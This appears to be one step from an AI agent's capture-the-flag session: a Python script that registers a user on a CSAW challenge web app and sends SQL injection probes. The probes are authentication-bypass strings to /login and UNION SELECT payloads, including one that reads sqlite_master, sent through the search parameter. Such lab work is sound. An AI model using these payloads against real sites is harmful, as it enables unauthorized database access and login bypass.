[15] create_file {"path": "/home/ctfplayer/workspace/sqlmap_probe.py", "content": "#!/usr/bin/env python3\n\"\"\"Probe the login SQLi and search SQLi on csale.chal.csaw.io:5000.\"\"\"\nimport http.cookiejar\nimport urllib.parse\nimport urllib.request\nimport re\n\nBASE = \"http://csale.chal.csaw.io:5000\"\n\n\ndef post(path, fields, opener):\n    data = urllib.parse.urlencode(fields).encode()\n    req = urllib.request.Request(BASE + path, data=data)\n    try:\n        resp = opener.open(req, timeout=30)\n        return resp.geturl(), resp.read().decode(errors=\"replace\"), resp.status\n    except urllib.error.HTTPError as e:\n        return e.geturl(), e.read().decode(errors=\"replace\"), e.code\n\n\ndef get(path, opener):\n    req = urllib.request.Request(BASE + path)\n    try:\n        resp = opener.open(req, timeout=30)\n        return resp.geturl(), resp.read().decode(errors=\"replace\"), resp.status\n    except urllib.error.HTTPError as e:\n        return e.geturl(), e.read().decode(errors=\"replace\"), e.code\n\n\ndef make_opener():\n    cj = http.cookiejar.CookieJar()\n    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))\n\n\ndef main():\n    # 1. Sign up a user to obtain a session\n    o = make_opener()\n    import random\n    import string\n    user = \"who\" + \"\".join(random.choice(string.ascii_lowercase) for _ in range(8))\n    url, body, code = post(\n        \"/signup\", {\"username\": user, \"password\": \"Passw0rd123\"}, o\n    )\n    print(f\"[signup {user}] {code} -> {url}\")\n    if \"error\" in body or code != 200:\n        m = re.search(r'<p class=\"error\">(.*?)</p>', body)\n        if m:\n            print(\"   error:\", m.group(1))\n    # check session\n    url, body, code = get(\"/\", o)\n    print(f\"[/] {code} -> {url}\")\n    if \"login\" in url:\n        print(\"   session not established?\")\n        return\n    m = re.search(r\"Balance: \\$([\\d.]+)\", body)\n    if m:\n        print(\"   balance:\", m.group(1))\n    m = re.search(r'<h3>(.*?)</h3>', body)\n    listings = re.findall(r'<h3>(.*?)</h3>', body)\n    print(\"   listings:\", listings[:20])\n\n    # 2. Baseline: what does the login SQLi look like?\n    # login requires the username to match a real user; cleaned is only used\n    # in the f-string query.\n    # Try clean='' (special chars only) first\n    for probe in [\"\", \"x'--\", \"' OR '1'='1\"]:\n        url, body, code = post(\n            \"/login\", {\"username\": probe, \"password\": \"x\"}, o\n        )\n        print(f\"[login {probe!r}] {code} -> {url}\")\n        m = re.search(r'<p class=\"error\">(.*?)</p>', body)\n        if m:\n            print(\"   error:\", m.group(1))\n        m = re.search(r'Balance: \\$([\\d.]+)', body)\n        if m:\n            print(\"   balance:\", m.group(1))\n\n    # 3. Search injection: try a UNION SELECT that should reveal something\n    for probe in [\n        \"' UNION SELECT 1,2,3,4,5,6,7--\",\n        \"' UNION SELECT sql,2,3,4,5,6,7 FROM sqlite_master--\",\n    ]:\n        q = urllib.parse.quote(probe)\n        url, body, code = get(\"/?q=\" + q, o)\n        print(f\"[search {probe!r}] {code} -> {url}\")\n        # extract listing titles from the response\n        titles = re.findall(r'<h3>(.*?)</h3>', body)\n        print(\"   titles:\", titles[:10])\n        m = re.search(r'<p class=\"error\">(.*?)</p>', body)\n        if m:\n            print(\"   error:\", m.group(1))\n        # print a bit of the grid\n        grid = re.search(r'<section class=\"grid\">(.*?)</section>', body, re.S)\n        if grid:\n            print(\"   grid snippet:\", grid.group(1)[:600])\n\n\nif __name__ == \"__main__\":\n    main()\n"}
